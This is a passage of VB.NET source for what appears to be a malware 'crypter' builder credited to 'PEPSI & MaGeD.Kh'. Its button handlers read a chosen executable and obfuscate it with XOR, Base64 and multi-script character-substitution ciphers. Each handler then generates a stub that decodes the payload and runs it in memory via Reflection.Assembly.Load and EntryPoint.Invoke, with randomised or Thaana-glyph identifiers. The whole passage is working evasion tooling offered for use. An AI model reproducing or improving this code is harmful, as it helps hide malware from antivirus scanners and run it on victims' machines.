                Dim xorstair = Convert.ToBase64String(XOREncrypt(EnC(a, stairskey), XorKey))
                Me.TextBox1.Text = String.Concat(New String() {"Imports System.Security.Cryptography" & ChrW(13) & ChrW(10) & "Imports System.IO" & ChrW(13) & ChrW(10) & "Imports System.Text" & ChrW(13) & ChrW(10) & "Module ", Strr1 & ChrW(13) & ChrW(10), "'Coded By PEPSI & MaGeD.Kh" & ChrW(13) & ChrW(10) & "dim ", Strr2, " as string = " & """" & xorstair & """" & ChrW(13) & ChrW(10) & "Dim ", Strr3, " ()as Byte =  方式非常感谢用英文怎么说涯问答外频道频道余感(方式非常感谢用英文怎么说天涯问答外语频道余(Convert.FromBase64String(", Strr2, ")" & "," & """", XorKey, """" & ")" & "," & """", stairskey, """" & ")" & ChrW(13) & ChrW(10) & Me.TextBox5.Text & ChrW(13) & ChrW(10), My.Resources.XorStairsDec})



            Catch ex As Exception
            End Try
        End If
    End Sub


    Private Sub FlatStickyButton15_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlatStickyButton15.Click
        TextBox4.Text = ""
        'Hex2Byte()
        TextBox4.Text = "'Coded By PEPSI & MaGeD.Kh" & vbNewLine & vbNewLine
        TextBox4.Text += Hex2ByteVB()
    End Sub


    Private Sub FlatStickyButton14_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlatStickyButton14.Click
        TextBox4.Text = ""
        TextBox4.Text = "'Coded By PEPSI & MaGeD.Kh" & vbNewLine & vbNewLine
        TextBox4.Text += "Imports System.IO.Compression" & vbNewLine
        TextBox4.Text += "Imports System.IO" & vbNewLine & vbNewLine
        TextBox4.Text += My.Resources.CompressVB
    End Sub

    Private Sub FlatStickyButton16_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlatStickyButton16.Click
        TextBox4.Text = ""
        TextBox4.Text = "'Coded By PEPSI & MaGeD.Kh" & vbNewLine & vbNewLine
        TextBox4.Text += My.Resources.ResWritVBCode
    End Sub

    Private Sub FlatStickyButton13_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlatStickyButton13.Click
        If FlatTextBox1.Text = "" Then
            MsgBox("Please Add File To Convert", MsgBoxStyle.Critical)
        Else
            Dim num As Long
            Dim num3 As Integer = Convert.ToInt32(FlatNumeric1.Value)
            Dim text As String = FlatTextBox1.Text
            Dim writer As New StreamWriter((Application.StartupPath & "/tempo.tmp"))
            Dim length As Long = New FileInfo(FlatTextBox1.Text).Length
            Dim strArray As String() = New String((CInt(length) + 1) - 1) {}
            Dim buffer As Byte() = New Byte((CInt(length) + 1) - 1) {}
            buffer = FileToByteArray(FlatTextBox1.Text)
            length = (length - 1)
            writer.Write(String.Concat(New String() {"Public Class PEPSI & MaGeD.Kh" & vbNewLine & "Dim ", TextBox3.Text, " As String" & ChrW(13) & ChrW(10) & ChrW(13) & ChrW(10) & ChrW(13) & ChrW(10) & "Sub ", TextBox2.Text, "()" & ChrW(13) & ChrW(10)}))
            Dim num4 As Long = length
            num = 0
            Do While (num <= num4)
                strArray(CInt(num)) = Conversion.Hex(buffer(CInt(num)))
                If (strArray(CInt(num)).Length = 1) Then
                    strArray(CInt(num)) = ("0" & strArray(CInt(num)))
                End If
                num = (num + 1)
            Loop
            writer.Write((ChrW(13) & ChrW(10) & TextBox2.Text & " = """ & strArray(0)))
            Dim num5 As Long = length
            num = 1
            Do While (num <= num5)
                If ((CDbl(num) Mod (CDbl(num3) / 2)) = 0) Then
                    writer.Write(String.Concat(New String() {"""" & ChrW(13) & ChrW(10), TextBox3.Text, " = ", TextBox2.Text, " & """, strArray(CInt(num))}))
                Else
                    writer.Write(strArray(CInt(num)))
                End If
                num = (num + 1)
            Loop
            writer.Write("""" & ChrW(13) & ChrW(10) & ChrW(13) & ChrW(10) & "End Sub" & vbNewLine & "End Class")
            writer.Close()
            TextBox4.Text = File.ReadAllText(Application.StartupPath & "/tempo.tmp")
            File.Delete(Application.StartupPath & "/tempo.tmp")
        End If
    End Sub

    Private Sub FlatStickyButton26_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlatStickyButton26.Click
        TextBox4.Text = ""
        TextBox4.Text = "'Coded By PEPSI" & vbNewLine & vbNewLine
        TextBox4.Text = "Imports System.Runtime.InteropServices" & vbNewLine
        TextBox4.Text += ResourceWriterVB()
        Form2.Show()
    End Sub

    Private Sub FlatStickyButton12_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlatStickyButton12.Click
        TextBox2.Text = GeneratePassword(True, True, False, False, RandomNumber(10, 8))
        TextBox3.Text = GeneratePassword(True, True, False, False, RandomNumber(10, 8))
    End Sub

    Private Sub FlatStickyButton20_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlatStickyButton20.Click
        Dim uniqueKey As String = EntryPoint.GetUniqueKey(&H23)
        Dim str2 As String = EntryPoint.GetUniqueKey(30)
        Dim str3 As String = EntryPoint.GetUniqueKey(&H19)
        If Me.RadioButton7.Checked Then
            Me.TextBox5.Text = String.Concat(New String() {"Sub main" & ChrW(13) & ChrW(10) & "Dim ވޖހވޖހވޖހވގފޗފގޗފދތރޔތޔ As System.Object" & ChrW(13) & ChrW(10) & "Dim ވޖހވޖހހގފހގފތފހތޗފދތރޔތޔ As System.Reflection.Assembly " & ChrW(13) & ChrW(10) & "ވޖހވޖހވޖހވގފޗފގޗފދތރޔތޔ = ވޖހވޖހހގފހގފތފހތޗފދތރޔތޔ " & ChrW(13) & ChrW(10), "ވޖހވޖހހގފހގފތފހތޗފދތރޔތޔ = Assembly.Load("").EntryPoint.Invoke(Nothing, Nothing)" & ChrW(13) & ChrW(10) & "End Sub"})
        End If
        If Me.RadioButton8.Checked Then
            Me.TextBox5.Text = String.Concat(New String() {"Sub main" & ChrW(13) & ChrW(10) & "Dim ", uniqueKey, " As Object = Reflection.Assembly.Load(""PEPSI & MaGeD.Kh"")" & ChrW(13) & ChrW(10), uniqueKey, ".EntryPoint.Invoke(Nothing, Nothing)" & ChrW(13) & ChrW(10) & " End Sub"})
        End If
        If Me.RadioButton9.Checked Then
            Me.TextBox5.Text = String.Concat(New String() {"Sub main(ByVal ", uniqueKey, " As String())" & ChrW(13) & ChrW(10) & "Dim ", str2, " As Object() = New Object(-1) {}" & ChrW(13) & ChrW(10) & "Dim ", str3, " As System.Reflection.Assembly = AppDomain.CurrentDomain.Load(""PEPSI & MaGeD.Kh"")" & ChrW(13) & ChrW(10) & "If ", str3, ".EntryPoint.GetParameters().Length > 0 Then" & ChrW(13) & ChrW(10), str2, " = New Object() {", uniqueKey, "}" & ChrW(13) & ChrW(10) & "End If" & ChrW(13) & ChrW(10), str3, ".EntryPoint.Invoke(Nothing, ", str2, ")" & ChrW(13) & ChrW(10) & "End Sub"})
        End If
    End Sub
    
    Private Sub FlatButton26_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlatButton26.Click
        If FlatTextBox1.Text = "" Then
            MsgBox("Please Add File To Convert", MsgBoxStyle.Critical)
        Else
            Try
                TextBox1.Text = ""
                Dim PX = PXEncrypt(Convert.ToBase64String(System.IO.File.ReadAllBytes(FlatTextBox1.Text)))
                Me.TextBox1.Text = String.Concat(New String() {"Module ", Strr1 & ChrW(13) & ChrW(10), "'Coded By PEPSI" & ChrW(13) & ChrW(10) & "Dim ", Strr2, " as string = " & """" & PX & """" & ChrW(13) & ChrW(10) & "Dim ", Strr3, " ()as Byte = Convert.FromBase64String(PXEncrypt (", Strr2, ")" & ")" & ChrW(13) & ChrW(10), Me.TextBox5.Text & ChrW(13) & ChrW(10), My.Resources.PX & ChrW(13) & ChrW(10), "End Module"})
            Catch ex As Exception
            End Try
        End If

    End Sub
    Public Shared Function PXEncrypt(ByVal ParmEnc As String)
        ParmEnc = ParmEnc.Replace("a", "月").Replace("A", "아").Replace("b", "官").Replace("B", "악").Replace("c", "匹").Replace("C", "안").Replace("d", "力").Replace("D", "알").Replace("e", "三").Replace("E", "앙").Replace("f", "下").Replace("F", "앞").Replace("g", "巨").Replace("G", "얘").Replace("h", "升").Replace("H", "ᄍ").Replace("i", "工").Replace("I", "ᄊ").Replace("j", "丁").Replace("J", "ᄈ").Replace("k", "水").Replace("K", "응").Replace("l", "心").Replace("L", "읍").Replace("m", "冊").Replace("M", "음").Replace("n", "內").Replace("N", "을").Replace("o", "口").Replace("O", "임").Replace("p", "戶").Replace("P", "잎").Replace("q", "已").Replace("Q", "율").Replace("r", "尺").Replace("R", "월").Replace("s", "弓").Replace("S", "원").Replace("t", "七").Replace("T", "웅").Replace("u", "臼").Replace("U", "울").Replace("v", "人").Replace("V", "운").Replace("w", "山").Replace("W", "옴").Replace("x", "父").Replace("X", "왕").Replace("y", "了").Replace("Y", "왜").Replace("z", "乙").Replace("Z", "에")
        Return ParmEnc
    End Function

    Private Sub FlatButton24_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlatButton24.Click
        If FlatTextBox1.Text = "" Then
            MsgBox("Please Add File To Convert", MsgBoxStyle.Critical)
        Else
            Try
                TextBox1.Text = ""
                Dim PZ = PZEncrypt(Convert.ToBase64String(System.IO.File.ReadAllBytes(FlatTextBox1.Text)))
                Me.TextBox1.Text = String.Concat(New String() {"Module ", Strr1 & ChrW(13) & ChrW(10), "'Coded By PEPSI" & ChrW(13) & ChrW(10) & "Dim ", Strr2, " as string = " & """" & PZ & """" & ChrW(13) & ChrW(10) & "Dim ", Strr3, " ()as Byte = Convert.FromBase64String(PZEncrypt (", Strr2, ")" & ")" & ChrW(13) & ChrW(10), Me.TextBox5.Text & ChrW(13) & ChrW(10), My.Resources.PZ & ChrW(13) & ChrW(10), "End Module"})
            Catch ex As Exception
            End Try
        End If
    End Sub
    Public Shared Function PZEncrypt(ByVal ParmEnc As String)
        ParmEnc = ParmEnc.Replace("a", "那").Replace("A", "你").Replace("b", "您").Replace("B", "八").Replace("c", "百").Replace("C", "北").Replace("d", "朋").Replace("D", "七").Replace("e", "多").Replace("E", "大").Replace("f", "起").Replace("F", "千千").Replace("g", "弟").Replace("G", "地").Replace("h", "认").Replace("H", "二").Replace("i", "方").Replace("I", "上").Replace("j", "哥").Replace("J", "个").Replace("k", "谁谁").Replace("K", "贵").Replace("l", "国").Replace("L", "过").Replace("m", "什").Replace("M", "好").Replace("n", "很").Replace("N", "会").Replace("o", "家").Replace("O", "见").Replace("p", "生").Replace("P", "姐").Replace("q", "师").Replace("Q", "九").Replace("r", "可").Replace("R", "老").Replace("s", "识").Replace("S", "零").Replace("t", "六").Replace("T", "十").Replace("u", "妈").Replace("U", "么").Replace("v", "是").Replace("V", "四").Replace("w", "妹").Replace("W", "们").Replace("x", "明").Replace("X", "왕").Replace("y", "名").Replace("Y", "왜").Replace("z", "哪").Replace("Z", "에")
        Return ParmEnc
    End Function

    Private Sub FlatButton25_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlatButton25.Click
        If FlatTextBox1.Text = "" Then
            MsgBox("Please Add File To Convert", MsgBoxStyle.Critical)
        Else
            Try
                TextBox1.Text = ""
                Dim PS = PSEncrypt(Convert.ToBase64String(System.IO.File.ReadAllBytes(FlatTextBox1.Text)))
                Me.TextBox1.Text = String.Concat(New String() {"Module ", Strr1 & ChrW(13) & ChrW(10), "'Coded By PEPSI" & ChrW(13) & ChrW(10) & "Dim ", Strr2, " as string = " & """" & PS & """" & ChrW(13) & ChrW(10) & "Dim ", Strr3, " ()as Byte = Convert.FromBase64String(PSEncrypt (", Strr2, ")" & ")" & ChrW(13) & ChrW(10), Me.TextBox5.Text & ChrW(13) & ChrW(10), My.Resources.PS & ChrW(13) & ChrW(10), "End Module"})
            Catch ex As Exception
            End Try
        End If

    End Sub
    Public Shared Function PSEncrypt(ByVal ParmEnc As String)
        ParmEnc = ParmEnc.Replace("a", "ރ").Replace("A", "އ").Replace("b", "ތ").Replace("B", "ޔ").Replace("c", "ޕ").Replace("C", "ސ").Replace("d", "ދ").Replace("D", "ފ").Replace("e", "ހ").Replace("E", "ޖ").Replace("f", "ކ").Replace("F", "ލ").Replace("g", "ޒ").Replace("G", "×").Replace("h", "ޗ").Replace("H", "ވ").Replace("i", "ބ").Replace("I", "ނ").Replace("j", "މ").Replace("J", "'").Replace("k", "ק").Replace("K", "ר").Replace("l", "א").Replace("L", "ט").Replace("m", "ו").Replace("M", "ן").Replace("n", "ם").Replace("N", "פ").Replace("o", "ש").Replace("O", "ד").Replace("p", "ג").Replace("P", "כ").Replace("q", "ע").Replace("Q", "י").Replace("r", "ח").Replace("R", "ל").Replace("s", "ך").Replace("S", "ז").Replace("t", "ס").Replace("T", "ב").Replace("u", "ה").Replace("U", "נ").Replace("v", "מ").Replace("V", "צ").Replace("w", "ת").Replace("W", "ץ").Replace("x", "父").Replace("X", "왕").Replace("y", "了").Replace("Y", "왜").Replace("z", "乙").Replace("Z", "에")
        Return ParmEnc
    End Function

    Private Sub FlatButton30_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlatButton30.Click
        If FlatTextBox1.Text = "" Then
            MsgBox("Please Add File To Convert", MsgBoxStyle.Critical)
        Else
            Try
                TextBox1.Text = ""
                Dim PT = PTEncrypt(Convert.ToBase64String(System.IO.File.ReadAllBytes(FlatTextBox1.Text)))
                Me.TextBox1.Text = String.Concat(New String() {"Module ", Strr1 & ChrW(13) & ChrW(10), "'Coded By PEPSI" & ChrW(13) & ChrW(10) & "Dim ", Strr2, " as string = " & """" & PT & """" & ChrW(13) & ChrW(10) & "Dim ", Strr3, " ()as Byte = Convert.FromBase64String(PTEncrypt (", Strr2, ")" & ")" & ChrW(13) & ChrW(10), Me.TextBox5.Text & ChrW(13) & ChrW(10), My.Resources.PT & ChrW(13) & ChrW(10), "End Module"})
            Catch ex As Exception
            End Try
        End If
    End Sub
    Public Shared Function PTEncrypt(ByVal ParmEnc As String)
        ParmEnc = ParmEnc.Replace("a", "月").Replace("A", "ד").Replace("b", "官").Replace("B", "악").Replace("c", "匹").Replace("C", "안").Replace("d", "力").Replace("D", "알").Replace("e", "三").Replace("E", "앙").Replace("f", "下").Replace("F", "앞").Replace("g", "巨").Replace("G", "얘").Replace("h", "升").Replace("H", "ᄍ").Replace("i", "工").Replace("I", "ᄊ").Replace("j", "丁").Replace("J", "ᄈ").Replace("k", "水").Replace("K", "응").Replace("l", "心").Replace("L", "읍").Replace("m", "冊").Replace("M", "음").Replace("n", "內").Replace("N", "을").Replace("o", "口").Replace("O", "임").Replace("p", "戶").Replace("P", "잎").Replace("q", "已").Replace("Q", "율").Replace("r", "尺").Replace("R", "월").Replace("s", "弓").Replace("S", "원").Replace("t", "七").Replace("T", "웅").Replace("u", "臼").Replace("U", "울").Replace("v", "人").Replace("V", "운").Replace("w", "山").Replace("W", "옴").Replace("x", "父").Replace("X", "왕").Replace("y", "了").Replace("Y", "왜").Replace("z", "乙").Replace("Z", "에")
        Return ParmEnc
    End Function

    Private Sub FlatButton28_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlatButton28.Click
        If FlatTextBox1.Text = "" Then
            MsgBox("Please Add File To Convert", MsgBoxStyle.Critical)
        Else
            Try
                TextBox1.Text = ""
                Dim P55 = P55Encrypt(Convert.ToBase64String(System.IO.File.ReadAllBytes(FlatTextBox1.Text)))
                Me.TextBox1.Text = String.Concat(New String() {"Module ", Strr1 & ChrW(13) & ChrW(10), "'Coded By PEPSI" & ChrW(13) & ChrW(10) & "Dim ", Strr2, " as string = " & """" & P55 & """" & ChrW(13) & ChrW(10) & "Dim ", Strr3, " ()as Byte = Convert.FromBase64String(P55Encrypt (", Strr2, ")" & ")" & ChrW(13) & ChrW(10), Me.TextBox5.Text & ChrW(13) & ChrW(10), My.Resources.P55 & ChrW(13) & ChrW(10), "End Module"})
            Catch ex As Exception
            End Try
        End If
    End Sub
    Public Shared Function P55Encrypt(ByVal ParmEnc As String)
        ParmEnc = ParmEnc.Replace("a", "那").Replace("A", "א").Replace("b", "您").Replace("B", "八").Replace("c", "百").Replace("C", "北").Replace("d", "朋").Replace("D", "七").Replace("e", "多").Replace("E", "大").Replace("f", "起").Replace("F", "千千").Replace("g", "弟").Replace("G", "地").Replace("h", "认").Replace("H", "二").Replace("i", "方").Replace("I", "上").Replace("j", "哥").Replace("J", "个").Replace("k", "谁谁").Replace("K", "贵").Replace("l", "国").Replace("L", "过").Replace("m", "什").Replace("M", "好").Replace("n", "很").Replace("N", "会").Replace("o", "家").Replace("O", "见").Replace("p", "生").Replace("P", "姐").Replace("q", "师").Replace("Q", "九").Replace("r", "可").Replace("R", "老").Replace("s", "识").Replace("S", "零").Replace("t", "六").Replace("T", "十").Replace("u", "妈").Replace("U", "么").Replace("v", "是").Replace("V", "四").Replace("w", "妹").Replace("W", "们").Replace("x", "明").Replace("X", "왕").Replace("y", "名").Replace("Y", "왜").Replace("z", "哪").Replace("Z", "에")
        Return ParmEnc
    End Function
    Private Sub FlatButton27_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlatButton27.Click
        If FlatTextBox1.Text = "" Then
            MsgBox("Please Add File To Convert", MsgBoxStyle.Critical)
        Else
            Try
                TextBox1.Text = ""
                Dim P7 = P7Encrypt(Convert.ToBase64String(System.IO.File.ReadAllBytes(FlatTextBox1.Text)))
                Me.TextBox1.Text = String.Concat(New String() {"Module ", Strr1 & ChrW(13) & ChrW(10), "'Coded By PEPSI" & ChrW(13) & ChrW(10) & "Dim ", Strr2, " as string = " & """" & P7 & """" & ChrW(13) & ChrW(10) & "Dim ", Strr3, " ()as Byte = Convert.FromBase64String(P7Encrypt (", Strr2, ")" & ")" & ChrW(13) & ChrW(10), Me.TextBox5.Text & ChrW(13) & ChrW(10), My.Resources.P7 & ChrW(13) & ChrW(10), "End Module"})
            Catch ex As Exception
            End Try
        End If
    End Sub
    Public Shared Function P7Encrypt(ByVal ParmEnc As String)
        ParmEnc = ParmEnc.Replace("a", "安").Replace("A", "吧").Replace("b", "爸").Replace("B", "八").Replace("c", "百").Replace("C", "北").Replace("d", "都").Replace("D", "对").Replace("e", "多").Replace("E", "大").Replace("f", "岛").Replace("F", "的").Replace("g", "弟").Replace("G", "地").Replace("h", "儿").Replace("H", "二").Replace("i", "方").Replace("I", "港").Replace("j", "哥").Replace("J", "个").Replace("k", "关").Replace("K", "贵").Replace("l", "国").Replace("L", "过").Replace("m", "海").Replace("M", "好").Replace("n", "很").Replace("N", "会").Replace("o", "家").Replace("O", "见").Replace("p", "叫").Replace("P", "姐").Replace("q", "京").Replace("Q", "九").Replace("r", "可").Replace("R", "老").Replace("s", "李").Replace("S", "零").Replace("t", "六").Replace("T", "吗").Replace("u", "妈").Replace("U", "么").Replace("v", "没").Replace("V", "美").Replace("w", "妹").Replace("W", "们").Replace("x", "明").Replace("X", "왕").Replace("y", "名").Replace("Y", "왜").Replace("z", "哪").Replace("Z", "에")
        Return ParmEnc
    End Function

    Private Sub FlatButton31_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlatButton31.Click
        If FlatTextBox1.Text = "" Then
            MsgBox("Please Add File To Convert", MsgBoxStyle.Critical)
        Else
            Try
                TextBox1.Text = ""
                Dim PF = PSEncrypt(Convert.ToBase64String(System.IO.File.ReadAllBytes(FlatTextBox1.Text)))
                Me.TextBox1.Text = String.Concat(New String() {"Module ", Strr1 & ChrW(13) & ChrW(10), "'Coded By PEPSI" & ChrW(13) & ChrW(10) & "Dim ", Strr2, " as string = " & """" & PF & """" & ChrW(13) & ChrW(10) & "Dim ", Strr3, " ()as Byte = Convert.FromBase64String(PFEncrypt (", Strr2, ")" & ")" & ChrW(13) & ChrW(10), Me.TextBox5.Text & ChrW(13) & ChrW(10), My.Resources.PF & ChrW(13) & ChrW(10), "End Module"})
            Catch ex As Exception
            End Try
        End If
    End Sub
    Public Shared Function PFEncrypt(ByVal ParmEnc As String)
        ParmEnc = ParmEnc.Replace("a", "ރ").Replace("A", "އ").Replace("b", "ތ").Replace("B", "ޔ").Replace("c", "ޕ").Replace("C", "ސ").Replace("d", "ދ").Replace("D", "ފ").Replace("e", "ހ").Replace("E", "ޖ").Replace("f", "ކ").Replace("F", "ލ").Replace("g", "ޒ").Replace("G", "×").Replace("h", "ޗ").Replace("H", "ވ").Replace("i", "ބ").Replace("I", "ނ").Replace("j", "މ").Replace("J", "'").Replace("k", "ק").Replace("K", "ר").Replace("l", "א").Replace("L", "ט").Replace("m", "ו").Replace("M", "ן").Replace("n", "ם").Replace("N", "פ").Replace("o", "ש").Replace("O", "ד").Replace("p", "ג").Replace("P", "כ").Replace("q", "ע").Replace("Q", "י").Replace("r", "ח").Replace("R", "ל").Replace("s", "ך").Replace("S", "ז").Replace("t", "ס").Replace("T", "ב").Replace("u", "ה").Replace("U", "נ").Replace("v", "מ").Replace("V", "צ").Replace("w", "ת").Replace("W", "ץ").Replace("x", "父").Replace("X", "왕").Replace("y", "了").Replace("Y", "왜").Replace("z", "乙").Replace("Z", "에")
        Return ParmEnc
    End Function

    Private Sub FlatButton29_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlatButton29.Click
        If FlatTextBox1.Text = "" Then
            MsgBox("Please Add File To Convert", MsgBoxStyle.Critical)
        Else
            Try
                TextBox1.Text = ""
                Dim PQ = PQEncrypt(Convert.ToBase64String(System.IO.File.ReadAllBytes(FlatTextBox1.Text)))
                Me.TextBox1.Text = String.Concat(New String() {"Module ", Strr1 & ChrW(13) & ChrW(10), "'Coded By PEPSI" & ChrW(13) & ChrW(10) & "Dim ", Strr2, " as string = " & """" & PQ & """" & ChrW(13) & ChrW(10) & "Dim ", Strr3, " ()as Byte = Convert.FromBase64String(PQEncrypt (", Strr2, ")" & ")" & ChrW(13) & ChrW(10), Me.TextBox5.Text & ChrW(13) & ChrW(10), My.Resources.PQ & ChrW(13) & ChrW(10), "End Module"})
            Catch ex As Exception
            End Try
        End If
    End Sub
    Public Shared Function PQEncrypt(ByVal ParmEnc As String)
        ParmEnc = ParmEnc.Replace("a", "月").Replace("A", "ވ").Replace("b", "官").Replace("B", "악").Replace("c", "匹").Replace("C", "안").Replace("d", "力").Replace("D", "알").Replace("e", "三").Replace("E", "앙").Replace("f", "下").Replace("F", "앞").Replace("g", "巨").Replace("G", "얘").Replace("h", "升").Replace("H", "ᄍ").Replace("i", "工").Replace("I", "ᄊ").Replace("j", "丁").Replace("J", "ᄈ").Replace("k", "水").Replace("K", "응").Replace("l", "心").Replace("L", "읍").Replace("m", "冊").Replace("M", "음").Replace("n", "內").Replace("N", "을").Replace("o", "口").Replace("O", "임").Replace("p", "戶").Replace("P", "잎").Replace("q", "已").Replace("Q", "율").Replace("r", "尺").Replace("R", "월").Replace("s", "弓").Replace("S", "원").Replace("t", "七").Replace("T", "웅").Replace("u", "臼").Replace("U", "울").Replace("v", "人").Replace("V", "운").Replace("w", "山").Replace("W", "옴").Replace("x", "父").Replace("X", "왕").Replace("y", "了").Replace("Y", "왜").Replace("z", "乙").Replace("Z", "에")
        Return ParmEnc
    End Function

    Private Sub FlatButton32_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlatButton32.Click
        If FlatTextBox1.Text = "" Then
            MsgBox("Please Add File To Convert", MsgBoxStyle.Critical)
        Else
            Try
                TextBox1.Text = ""
                Dim PEPSI = PEPSIEncrypt(Convert.ToBase64String(System.IO.File.ReadAllBytes(FlatTextBox1.Text)))
                Me.TextBox1.Text = String.Concat(New String() {"Module ", Strr1 & ChrW(13) & ChrW(10), "'Coded By PEPSI" & ChrW(13) & ChrW(10) & "Dim ", Strr2, " as string = " & """" & PEPSI & """" & ChrW(13) & ChrW(10) & "Dim ", Strr3, " ()as Byte = Convert.FromBase64String(PEPSIEncrypt (", Strr2, ")" & ")" & ChrW(13) & ChrW(10), Me.TextBox5.Text & ChrW(13) & ChrW(10), My.Resources.XDXDX & ChrW(13) & ChrW(10), "End Module"})
            Catch ex As Exception
            End Try
        End If
    End Sub
    Public Shared Function PEPSIEncrypt(ByVal ParmEnc As String)
        ParmEnc = ParmEnc.Replace("a", "月").Replace("A", "ސ").Replace("b", "官").Replace("B", "악").Replace("c", "匹").Replace("C", "안").Replace("d", "力").Replace("D", "알").Replace("e", "三").Replace("E", "앙").Replace("f", "下").Replace("F", "앞").Replace("g", "巨").Replace("G", "얘").Replace("h", "升").Replace("H", "ᄍ").Replace("i", "工").Replace("I", "ᄊ").Replace("j", "丁").Replace("J", "ᄈ").Replace("k", "水").Replace("K", "응").Replace("l", "心").Replace("L", "읍").Replace("m", "冊").Replace("M", "음").Replace("n", "內").Replace("N", "을").Replace("o", "口").Replace("O", "임").Replace("p", "戶").Replace("P", "잎").Replace("q", "已").Replace("Q", "율").Replace("r", "尺").Replace("R", "월").Replace("s", "弓").Replace("S", "원").Replace("t", "七").Replace("T", "웅").Replace("u", "臼").Replace("U", "울").Replace("v", "人").Replace("V", "운").Replace("w", "山").Replace("W", "옴").Replace("x", "父").Replace("X", "왕").Replace("y", "了").Replace("Y", "왜").Replace("z", "乙").Replace("Z", "에")
        Return ParmEnc
    End Function


End Class

